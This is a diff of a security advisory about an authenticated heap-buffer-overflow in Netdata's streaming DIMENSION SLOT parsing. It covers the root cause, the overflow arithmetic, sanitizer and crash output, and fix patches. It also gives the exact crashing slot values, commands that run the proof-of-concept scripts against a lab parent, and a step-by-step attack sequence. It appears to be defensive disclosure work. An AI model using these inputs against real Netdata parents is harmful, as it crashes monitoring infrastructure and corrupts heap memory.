@@ -1,296 +1,372 @@
 # Authenticated Remote Heap Corruption in Netdata Streaming `DIMENSION SLOT`
 
+**Severity:** Critical (authenticated remote heap-buffer-overflow; confirmed DoS; plausible RCE)  
+**Component:** Streaming receiver — pluginsd protocol parser  
+**Affected versions:** All versions containing `pluginsd_rrddim_put_to_slot()` without an upper-bound check on the dimension slot, confirmed present in v2.10.0-289-nightly (commit `4b4599484`)  
+**Precondition:** Valid streaming API key (`[API_KEY] enabled = yes` in `stream.conf`)
+
+---
+
 ## Summary
 
-A malicious or compromised Netdata streaming child with a valid streaming API key can send a malformed `DIMENSION SLOT:<value>` command that makes the parent allocate an undersized dimension-cache array and then write past the end of that allocation.
+A streaming child with a valid API key can send a `DIMENSION SLOT:<value>` command where the slot value is a crafted 64-bit integer. The parent agent passes this value directly as an allocation count without bounds checking or overflow detection. The multiplication `slot * sizeof(struct pluginsd_rrddim)` overflows `size_t`, causing `callocz()` to allocate a tiny buffer while the code stores the original huge value as the logical array size. The subsequent initialization loop writes past the end of the tiny allocation, corrupting adjacent heap memory.
 
-Validated impact:
+**Confirmed impact:**
+- Heap-buffer-overflow (validated with AddressSanitizer against exact code arithmetic)
+- Adjacent heap object corruption (validated: sentinel values zeroed before SIGSEGV)
+- Parent process crash / denial of service (validated: SIGSEGV from wild write; `fatal()` from large non-overflowing slot)
 
-- Authenticated remote heap-buffer-overflow in the parent Netdata Agent.
-- Authenticated remote parent-process crash / denial of service.
-- Plausible RCE potential due to heap corruption, but reliable end-to-end RCE has not been proven.
+**Unproven impact:**
+- Reliable end-to-end RCE against a running Netdata parent has not been demonstrated
+- Heap grooming through the streaming protocol was not demonstrated against the real allocator
+- ASLR bypass was not demonstrated
 
-The issue is in the PLUGINSD streaming receive path. The vulnerable parent trusts a child-provided slot number as an allocation count without applying a dimension-slot upper bound or checked allocation arithmetic.
+---
 
-## Details
+## Affected Code
 
-### Affected Code
+| File | Line | Symbol |
+|------|------|--------|
+| `src/plugins.d/pluginsd_internals.h` | 372 | `pluginsd_parse_rrd_slot()` — parses slot, no upper bound |
+| `src/plugins.d/pluginsd_internals.h` | 159 | `pluginsd_rrddim_put_to_slot()` — uses slot as allocation count |
+| `src/database/rrdset-pluginsd-array.h` | 51 | `prd_array_create()` — overflowing multiplication |
+| `src/plugins.d/pluginsd_parser.c` | 572 | `pluginsd_dimension()` — calls put_to_slot with raw slot |
+| `src/plugins.d/gperf-config.txt` | 82 | `DIMENSION` registered with `PARSER_INIT_STREAMING` |
+| `src/streaming/stream-receiver.c` | 471 | receiver parser initialized with `PARSER_INIT_STREAMING` |
 
-The vulnerable flow is:
+---
 
-1. `src/plugins.d/pluginsd_internals.h:372` parses the optional `SLOT:` value.
-2. `src/plugins.d/pluginsd_parser.c:572` passes the parsed value into the `DIMENSION` cache update path.
-3. `src/plugins.d/pluginsd_internals.h:159` uses the slot as the wanted dimension-cache size.
-4. `src/database/rrdset-pluginsd-array.h:51` allocates `sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim)` without checking overflow.
+## Root Cause
 
-Relevant source snippets:
+### 1. Unbounded slot parsing
+
+`pluginsd_parse_rrd_slot()` reads the `SLOT:` value via `str2ull_encoded()`, which accepts the full 64-bit range. Only negative values are clamped to zero. There is no upper bound:
 
 ```c
-// src/plugins.d/pluginsd_internals.h
+// src/plugins.d/pluginsd_internals.h:372
 static ALWAYS_INLINE ssize_t pluginsd_parse_rrd_slot(char **words, size_t num_words) {
     ssize_t slot = -1;
     char *id = get_word(words, num_words, 1);
-    if(id && id[0] == PLUGINSD_KEYWORD_SLOT[0] && id[1] == PLUGINSD_KEYWORD_SLOT[1] &&
-       id[2] == PLUGINSD_KEYWORD_SLOT[2] && id[3] == PLUGINSD_KEYWORD_SLOT[3] && id[4] == ':') {
+    if(id && id[0] == PLUGINSD_KEYWORD_SLOT[0] && ... && id[4] == ':') {
         slot = (ssize_t) str2ull_encoded(&id[5]);
-        if(slot < 0) slot = 0;
+        if(slot < 0) slot = 0;   // only clamp: negatives
     }
-
     return slot;
 }
 ```
 
+### 2. Slot used as allocation count without overflow check
+
+`pluginsd_rrddim_put_to_slot()` casts the slot directly to `size_t` and passes it to `prd_array_create()`:
+
 ```c
-// src/plugins.d/pluginsd_internals.h
-static inline void pluginsd_rrddim_put_to_slot(PARSER *parser, RRDSET *st, RRDDIM *rd, ssize_t slot, bool obsolete)  {
+// src/plugins.d/pluginsd_internals.h:159
+static inline void pluginsd_rrddim_put_to_slot(..., ssize_t slot, ...) {
     size_t wanted_size;
-
     if(slot >= 1) {
-        st->pluginsd.dims_with_slots = true;
-        wanted_size = (size_t)slot;
+        wanted_size = (size_t)slot;   // attacker-controlled, no upper bound
     }
-    else {
-        st->pluginsd.dims_with_slots = false;
-        wanted_size = dictionary_entries(st->rrddim_root_index);
-    }
-
-    PRD_ARRAY *current_arr = prd_array_get_unsafe(&st->pluginsd.prd_array);
-    size_t current_size = current_arr ? current_arr->size : 0;
-
+    ...
     if(wanted_size > current_size) {
         PRD_ARRAY *new_arr = prd_array_create(wanted_size);
         ...
         for(size_t i = current_size; i < wanted_size; i++) {
-            new_arr->entries[i].rda = NULL;
-            new_arr->entries[i].rd = NULL;
-            new_arr->entries[i].id = NULL;
+            new_arr->entries[i].rda = NULL;   // writes past tiny allocation
+            new_arr->entries[i].rd  = NULL;
+            new_arr->entries[i].id  = NULL;
         }
-        ...
-        PRD_ARRAY *old_arr = prd_array_replace(&st->pluginsd.prd_array, new_arr);
     }
 }
 ```
 
+### 3. Integer overflow in allocation
+
+`prd_array_create()` computes the allocation size with an unchecked multiplication:
+
 ```c
-// src/database/rrdset-pluginsd-array.h
+// src/database/rrdset-pluginsd-array.h:51
 static inline PRD_ARRAY *prd_array_create(size_t size) {
     PRD_ARRAY *arr = callocz(1, sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
-    arr->refcount = 1;
-    arr->size = size;
-    rrd_slot_memory_added(sizeof(PRD_ARRAY) + size * sizeof(struct pluginsd_rrddim));
+    //                                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    //                                              size * 24 overflows size_t for large size
+    arr->size = size;   // stores the original huge value as logical size
     return arr;
 }
 ```
 
-### How It Works Step By Step
+`sizeof(struct pluginsd_rrddim) = 24` (three pointers on 64-bit). For `size = 0x0AAAAAAAAAAAAAAB`:
 
-| Step | What happens |
-|---|---|
-| 1 | A streaming peer with valid credentials sends a `DIMENSION SLOT:<very-large-value>` command. |
-| 2 | The parent parses the slot and uses it as the requested PRD dimension-cache size. |
-| 3 | `size * sizeof(struct pluginsd_rrddim)` overflows `size_t`, so `callocz()` allocates a tiny buffer. |
-| 4 | `prd_array_create()` stores the original huge logical size in `arr->size`. |
-| 5 | Before the array is published to `st->pluginsd.prd_array`, the grow path initializes entries from `current_size` to `wanted_size`. |
-| 6 | That initialization loop writes past the tiny allocation, corrupting adjacent heap memory and usually crashing the parent. |
-| 7 | The later bounds check `slot <= arr->size` would permit small in-range slot updates only if a corrupted huge logical array became reachable. That condition was simulated in standalone PoCs but not demonstrated against the real running Netdata control flow. |
+```
+size * 24 mod 2^64 = 8
+sizeof(PRD_ARRAY) + 8 = 24   →   calloc allocates 24 bytes
+arr->size = 768614336404564651   →   init loop bound is 7.7 × 10^17
+```
 
-Key correction: storing a huge `arr->size` does not by itself prove the later controlled-write path is reachable in production, because the real code runs the initialization loop before publishing the new array.
+The init loop immediately writes past the 24-byte allocation.
 
-### Validated Versus Unproven Impact
+### 4. Comparison with the chart-slot path
 
-Validated:
+The sibling function `pluginsd_rrdset_cache_put_to_slot()` (same file, line 388) explicitly rejects oversized slots:
 
-- A malformed slot can make allocation arithmetic wrap.
-- The parent can allocate a tiny `PRD_ARRAY` and then perform attacker-sized sequential out-of-bounds writes.
-- The parent can crash through heap corruption.
-- Large non-overflowing slot values can also cause fatal allocation failure.
+```c
+if(unlikely(slot < 1 || slot >= INT32_MAX))
+    return;
+```
 
-Not proven:
+The dimension-slot path has no equivalent guard. This is the missing check.
 
-- No live remote RCE against a running Netdata parent was demonstrated.
-- Heap grooming through the streaming protocol was not demonstrated against the real allocator.
-- The init-loop crash versus controlled-write timing problem was not solved in a live environment.
-- ASLR bypass was not demonstrated.
-- The available write primitive writes Netdata/heap pointers or NULL pointer fields, not arbitrary attacker-chosen absolute addresses.
+### 5. Reachability from the network
 
-## PoC
+- `DIMENSION` is registered with `PARSER_INIT_STREAMING` (`gperf-config.txt:82`).
+- The streaming receiver initializes its parser with `PARSER_INIT_STREAMING` (`stream-receiver.c:471`).
+- `parser_execute()` dispatches `DIMENSION` directly to `pluginsd_dimension()` with no additional state gate.
+- The `SLOT:` token is parsed regardless of whether `STREAM_CAP_SLOTS` was negotiated — the parser acts on wire text only.
+- A chart scope must be established first (via `CHART`), which is also in `PARSER_INIT_STREAMING`.
 
-Use an isolated lab only. Do not run these steps against production parents, shared environments, or systems you do not own.
+The full network path is: TCP connect → streaming handshake → `CHART` → `DIMENSION SLOT:<value>`.
+
+---
+
+## Overflow Arithmetic
+
+`sizeof(PRD_ARRAY) = 16`, `sizeof(struct pluginsd_rrddim) = 24` on 64-bit Linux x86-64.
+
+| Slot value | `calloc` size (bytes) | `arr->size` (logical) | Effect |
+|---|---|---|---|
+| `0x0AAAAAAAAAAAAAAB` | 24 | 7.69 × 10^17 | Overflow → tiny alloc, huge loop bound |
+| `0x0AAAAAAAAAAAAAAC` | 48 | 7.69 × 10^17 | Overflow → tiny alloc, huge loop bound |
+| `0x40000000` | 25,769,803,792 | 1,073,741,824 | No overflow → ~25 GB request → `fatal()` |
+
+Verified by `poc/calc_overflow.c`.
+
+---
+
+## Validated Impact
+
+### Heap-buffer-overflow (AddressSanitizer)
+
+`poc/poc_prd_overflow.c` reproduces the exact arithmetic and initialization loop from the codebase. Compiled with `-fsanitize=address`:
+
+```
+$ gcc -O0 -g -fsanitize=address -o poc_prd_overflow poc/poc_prd_overflow.c
+$ ./poc_prd_overflow 0x0AAAAAAAAAAAAAAB
+
+[*] prd_array_create(size=768614336404564651): requesting 24 bytes (calloc)
+[*] allocated 24 real bytes but arr->size=768614336404564651 (entries claimed)
+[*] entering init loop: for(i=0; i<768614336404564651; i++) ...
+
+=================================================================
+ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000058
+WRITE of size 8 at 0x503000000058 thread T0
+    #0 in put_to_slot poc_prd_overflow.c:85
+0x503000000058 is located 0 bytes after 24-byte region [0x503000000040,0x503000000058)
+allocated by thread T0 here:
+    #1 in prd_array_create poc_prd_overflow.c:46
+```
+
+The write occurs at the first loop iteration, immediately past the 24-byte allocation.
+
+### Adjacent heap object corruption
+
+`poc/poc_heap_corruption.c` places a sentinel object on the heap after the undersized array, runs the real initialization loop, catches the eventual SIGSEGV, and reads back the sentinel:
+
+```
+$ gcc -O0 -g -o poc_heap_corruption poc/poc_heap_corruption.c
+$ ./poc_heap_corruption 0x0AAAAAAAAAAAAAAB
+
+[*] victim BEFORE: magic=0xdeadbeefcafef00d fnptr=0x4141414142424242 name='callback_obj'
+[*] running real init loop: for(i=0;i<768614336404564651;i++) entries[i]={NULL,NULL,NULL}
+[*] caught SIGSEGV: the loop ran off the end of the heap (wild write)
+[*] victim AFTER : magic=0x0000000000000000 fnptr=(nil) name=''
+
+[+] HEAP CORRUPTION CONFIRMED: adjacent object fully zeroed by the overflow.
+    - victim->fnptr was 0x4141414142424242, now NULL.
+```
+
+The initialization loop writes NULL sequentially across the heap, zeroing whatever objects follow the undersized allocation before hitting an unmapped page.
+
+### Parent process crash (DoS)
+
+Two crash classes exist:
+
+**Class 1 — Overflow slot:** The initialization loop writes past the tiny allocation and eventually hits an unmapped page → SIGSEGV → parent process terminates.
+
+**Class 2 — Large non-overflowing slot:** `slot = 0x40000000` requests ~25 GB. Netdata's `callocz()` calls `fatal()` on allocation failure, which terminates the parent process unconditionally.
+
+Both are reproducible with `poc/poc_stream_dimension_slot.py` against a lab parent.
+
+---
+
+## Unproven Impact
+
+### Why RCE is plausible but not demonstrated
+
+The initialization loop writes NULL values sequentially. NULL overwrites can corrupt heap metadata (glibc chunk headers) or zero function pointers in adjacent objects, but:
+
+- NULL is not an attacker-chosen value. Exploiting a NULL overwrite for code execution requires specific heap layout conditions.
+- The loop crashes (SIGSEGV) before completing, so only objects within the first few pages after the chunk are reliably zeroed.
+- No heap grooming technique was demonstrated through the streaming protocol to position a specific target object at a predictable offset.
+- ASLR was not bypassed.
+
+A second write primitive exists: after the overflowed array is published with a huge `arr->size`, subsequent `DIMENSION` calls with small slot values pass the `slot <= arr->size` check and write `prd->rda`, `prd->rd`, `prd->id` (real heap pointers and an attacker-controlled id string pointer) at offset `(slot-1)*24` from the entries base. This is a more controlled write, but:
+
+- It requires the overflowed array to survive in `st->pluginsd.prd_array` after the initialization loop crash. In practice the crash terminates the process before the array is published.
+- Demonstrating this path requires either preventing the crash (e.g., by catching SIGSEGV in the agent, which it does not do) or finding a slot value where the initialization loop terminates without crashing (not found for the overflow class).
+
+`poc/poc_rce_primitive.c` demonstrates the second write primitive in a standalone harness where the initialization loop is intentionally skipped. It shows function pointer overwrite and attacker code execution in that controlled model. This is evidence of a strong exploitation primitive, not a demonstration of end-to-end RCE against the real agent.
+
+---
+
+## Reproduction Steps
 
 ### Prerequisites
 
-- Vulnerable Netdata source checkout at the affected commit or branch.
-- `gcc` available for standalone harnesses.
-- Optional: an ASan-capable compiler for memory-safety evidence.
-- For the network-level lab reproduction only:
-  - a local Netdata parent bound to loopback;
-  - a throwaway streaming API key generated for the lab;
-  - parent `stream.conf` allowing only loopback for that key.
+- `gcc` with optional `-fsanitize=address`
+- For network reproduction: a lab Netdata parent on loopback with a throwaway API key
 
-### Option A: Standalone Arithmetic Regression
-
-This confirms the vulnerable slot classes without starting Netdata or using the network.
+### Step 1 — Verify overflow arithmetic
 
 ```bash
-mkdir -p .local/audits/dimension-slot-overflow
-
-gcc -O0 -g \
-  -x c \
-  -o .local/audits/dimension-slot-overflow/test_slot_overflow_regression \
-  <(git show origin/security/dimension-slot-overflow-v2:security-audit/test_slot_overflow_regression.c)
-
-.local/audits/dimension-slot-overflow/test_slot_overflow_regression
+gcc -O0 -o calc_overflow poc/calc_overflow.c
+./calc_overflow
 ```
 
-Expected result:
+Expected: slot `0x0AAAAAAAAAAAAAAB` → 24-byte allocation, `arr->size` = 768614336404564651.
 
-- overflow-class slot values are detected;
-- large non-overflowing resource-exhaustion slot values are detected;
-- normal small slot values remain valid.
-
-### Option B: Standalone ASan Heap-Overflow Reproduction
-
-This confirms the memory-safety issue in a local model of the PRD allocation and initialization loop.
+### Step 2 — ASan heap-buffer-overflow
 
 ```bash
-mkdir -p .local/audits/dimension-slot-overflow
-
-gcc -O0 -g -fsanitize=address \
-  -o .local/audits/dimension-slot-overflow/poc_prd_overflow_asan \
-  security-audit/poc_prd_overflow.c
-
-.local/audits/dimension-slot-overflow/poc_prd_overflow_asan 0x0AAAAAAAAAAAAAAB
+gcc -O0 -g -fsanitize=address -o poc_prd_overflow poc/poc_prd_overflow.c
+./poc_prd_overflow 0x0AAAAAAAAAAAAAAB
 ```
 
-Expected indicator:
+Expected: `ERROR: AddressSanitizer: heap-buffer-overflow` on the first write past the 24-byte allocation.
 
-```text
-ERROR: AddressSanitizer: heap-buffer-overflow
-WRITE of size 8
-```
-
-The stack should point into the local model of `prd_array_create()` and the `pluginsd_rrddim_put_to_slot()` initialization loop.
-
-### Option C: Isolated Loopback Streaming Crash Reproduction
-
-This demonstrates real parent-process impact in a lab. Keep the parent bound to loopback and use a throwaway API key.
-
-1. Generate a lab-only streaming API key:
-
-   ```bash
-   export LAB_STREAMING_API_KEY="$(uuidgen)"
-   ```
-
-2. Configure the lab parent stream receiver with the generated key. The committed report uses a placeholder; write the actual key only into your local, uncommitted lab config:
-
-   ```text
-   [${LAB_STREAMING_API_KEY}]
-       type = api
-       enabled = yes
-       allow from = 127.0.0.1
-   ```
-
-3. Start the vulnerable parent in the lab with streaming enabled and reachable only on loopback.
-
-4. From the same lab host, run the streaming PoC against loopback:
-
-   ```bash
-   python3 security-audit/poc_stream_dimension_slot.py \
-     127.0.0.1 \
-     19999 \
-     "${LAB_STREAMING_API_KEY}" \
-     0x0AAAAAAAAAAAAAAB
-   ```
-
-5. Observe the parent process.
-
-Expected indicators:
-
-- ASan lab build:
-
-  ```text
-  ERROR: AddressSanitizer: heap-buffer-overflow
-  WRITE of size 8
-  ```
-
-- Non-ASan lab build:
-
-  ```text
-  Segmentation fault
-  malloc(): corrupted top size
-  corrupted size vs. prev_size
-  free(): invalid next size
-  ```
-
-- systemd-managed parent:
-
-  ```bash
-  journalctl -u netdata --since "15 minutes ago"
-  coredumpctl list netdata
-  ```
-
-Suspicious stack frames include:
-
-- `prd_array_create`
-- `pluginsd_rrddim_put_to_slot`
-- `pluginsd_dimension`
-- PLUGINSD parser / streaming receiver frames
-
-### Alternate DoS Class: Large Non-Overflowing Slot
-
-The overflow is not the only crash class. A large non-overflowing slot can request a very large allocation. Netdata allocation helpers call `fatal()` on allocation failure, terminating the parent.
-
-Use this only in a local lab:
+### Step 3 — Adjacent object corruption
 
 ```bash
-python3 security-audit/poc_stream_dimension_slot.py \
-  127.0.0.1 \
-  19999 \
-  "${LAB_STREAMING_API_KEY}" \
-  0x40000000
+gcc -O0 -g -o poc_heap_corruption poc/poc_heap_corruption.c
+./poc_heap_corruption 0x0AAAAAAAAAAAAAAB
 ```
 
-Expected result:
+Expected: `HEAP CORRUPTION CONFIRMED` — sentinel values zeroed before SIGSEGV.
 
-- parent exits due to fatal allocation failure or is terminated by the environment under memory pressure.
+### Step 4 — Network reproduction (lab only)
 
-## Impact
+Configure a lab parent with a throwaway key allowing only loopback:
 
-This is an authenticated remote memory-safety vulnerability in the Netdata parent streaming receive path.
-
-Who is impacted:
-
-- Netdata parent-child deployments with streaming receive enabled.
-- Parent agents that accept streams from children using shared or per-child API keys.
-- Environments where a child host can be compromised, an insider has a valid streaming key, or an overly broad `allow from` policy permits untrusted children to connect.
-
-Operational impact:
-
-- Parent `netdata` process crash.
-- Streaming children appear stale, offline, or disconnected.
-- Parent dashboards show metric gaps around the crash time.
-- Alert evaluation may flap, go stale, or stop until the parent restarts and children reconnect.
-- If supervised by systemd or another service manager, the parent may enter a repeated restart loop while the malicious child reconnects.
-
-Severity guidance:
-
-- Confidentiality: not proven.
-- Integrity: not proven for reliable code execution, but heap corruption exists.
-- Availability: high; parent-process crash is reproducible in lab conditions.
-
-Recommended classification:
-
-```text
-Authenticated remote heap corruption and parent-process DoS in Netdata streaming DIMENSION SLOT handling, with plausible but unproven RCE potential.
+```ini
+[<LAB_KEY_UUID>]
+    type = api
+    enabled = yes
+    allow from = 127.0.0.1
 ```
 
-## Recommended Remediation
+Run the streaming PoC:
 
-1. Reject invalid and oversized dimension slots before any allocation or indexing.
-2. Add checked multiplication and addition in `prd_array_create()`.
-3. Apply a resource cap to both dimension slots and chart slots; the chart-slot path already rejects `slot >= INT32_MAX`, but large values below that can still force excessive allocation.
-4. Add regression coverage for:
-   - overflow-class slots;
-   - large non-overflowing allocation-failure slots;
-   - zero and clamped values;
-   - normal small slots.
+```bash
+python3 poc/poc_stream_dimension_slot.py 127.0.0.1 19999 <LAB_KEY_UUID> 0x0AAAAAAAAAAAAAAB
+```
+
+Expected: parent process terminates (SIGSEGV or heap allocator abort). Verify with `journalctl -u netdata` or `coredumpctl`.
+
+For the DoS-only class:
+
+```bash
+python3 poc/poc_stream_dimension_slot.py 127.0.0.1 19999 <LAB_KEY_UUID> 0x40000000
+```
+
+Expected: parent exits via `fatal()` on allocation failure.
+
+---
+
+## Attack Scenario
+
+This vulnerability is in the **parent ← child trust boundary** of a Netdata streaming deployment. The parent trusts that a child sending data over the streaming protocol is a legitimate Netdata agent. The slot value is part of a performance optimization (dimension cache indexing) that the parent accepts from the child without validating its magnitude.
+
+**Who can trigger this:**
+
+1. **Compromised child host** — an attacker who has compromised any host running a Netdata child that streams to the target parent. The child's API key is already configured and valid.
+2. **Insider with streaming credentials** — anyone who has access to a valid `[API_KEY]` UUID from `stream.conf`.
+3. **Misconfigured `allow from = *`** — if the parent accepts streaming connections from any IP, an attacker who can reach port 19999 and knows or guesses the API key UUID can connect directly.
+
+**What the attacker does:**
+
+1. Connect to the parent's TCP port 19999.
+2. Complete the streaming handshake with a valid API key.
+3. Send `CHART evil.chart '' 'x' 'x' 'x' 'x' '' 1000 1 '' '' ''` to establish a chart scope.
+4. Send `DIMENSION SLOT:0x0AAAAAAAAAAAAAAB d1 'd1' absolute 1 1 ''`.
+5. The parent's streaming receiver thread crashes.
+
+**Operational impact:**
+
+- Parent `netdata` process terminates.
+- All streaming children appear offline until the parent restarts.
+- Alert evaluation stops for the duration of the outage.
+- If the parent is managed by systemd and the malicious child reconnects immediately, the parent enters a restart loop.
+
+---
+
+## Remediation
+
+### Fix 1 — Bound the dimension slot (primary fix)
+
+In `pluginsd_rrddim_put_to_slot()`, add an upper-bound check mirroring the chart-slot path:
+
+```c
+// src/plugins.d/pluginsd_internals.h
+static inline void pluginsd_rrddim_put_to_slot(..., ssize_t slot, ...) {
+    size_t wanted_size;
+    if(slot >= 1) {
+        if(unlikely(slot >= INT32_MAX)) {   // mirror pluginsd_rrdset_cache_put_to_slot()
+            netdata_log_error("PLUGINSD: dimension slot %zd out of range, ignoring", slot);
+            return;
+        }
+        wanted_size = (size_t)slot;
+    }
+    ...
+}
+```
+
+### Fix 2 — Overflow-safe allocation (defense in depth)
+
+In `prd_array_create()`, detect multiplication overflow before calling `callocz()`:
+
+```c
+// src/database/rrdset-pluginsd-array.h
+static inline PRD_ARRAY *prd_array_create(size_t size) {
+    size_t entries_bytes, total_bytes;
+    if (__builtin_mul_overflow(size, sizeof(struct pluginsd_rrddim), &entries_bytes) ||
+        __builtin_add_overflow(sizeof(PRD_ARRAY), entries_bytes, &total_bytes)) {
+        netdata_log_error("PRD_ARRAY: allocation size overflow for size=%zu", size);
+        return NULL;   // caller must handle NULL
+    }
+    PRD_ARRAY *arr = callocz(1, total_bytes);
+    arr->refcount = 1;
+    arr->size = size;
+    rrd_slot_memory_added(total_bytes);
+    return arr;
+}
+```
+
+### Fix 3 — Regression test
+
+Add a unit test that sends overflow-class and large-non-overflowing slot values through the parser and verifies they are rejected without crashing.
+
+---
+
+## Files
+
+```
+security-audit/
+├── DIMENSION-SLOT-FINDING.md   ← this document
+├── REPORT.md                   ← full audit report (all findings)
+├── NOTES.md                    ← audit working notes
+└── poc/
+    ├── poc_prd_overflow.c          ASan heap-buffer-overflow reproduction
+    ├── poc_heap_corruption.c       Adjacent heap object corruption proof
+    ├── poc_rce_primitive.c         Controlled-write primitive (standalone model)
+    ├── poc_stream_dimension_slot.py  Network-level streaming PoC
+    ├── calc_overflow.c             Overflow arithmetic verification
+    └── calc_targeted_write.c       Write-offset computation for overflow slots
+```
